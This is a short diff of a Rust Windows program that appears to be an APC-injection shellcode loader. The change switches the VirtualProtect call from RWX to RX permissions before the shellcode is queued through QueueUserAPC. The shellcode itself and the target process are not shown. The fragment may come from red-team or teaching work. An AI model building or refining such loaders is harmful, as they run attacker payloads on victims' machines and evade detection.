@@ -5,7 +5,7 @@ use std::{
 use windows::core::Result;
 use windows::Win32::System::Memory::{
     VirtualAlloc, VirtualProtect, MEM_COMMIT, 
-    MEM_RESERVE, PAGE_EXECUTE_READWRITE,
+    MEM_RESERVE, PAGE_EXECUTE_READ,
     PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
 };
 use windows::Win32::System::Threading::{
@@ -56,7 +56,7 @@ fn main() -> Result<()> {
 
         // Change memory permissions to RX so the shellcode can be executed
         let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
-        VirtualProtect(address, buf.len(), PAGE_EXECUTE_READWRITE, &mut oldprotect)?;
+        VirtualProtect(address, buf.len(), PAGE_EXECUTE_READ, &mut oldprotect)?;
 
         // Queue the shellcode for execution as an APC in the thread's context.
         QueueUserAPC(Some(std::mem::transmute(address)), hthread, 0);
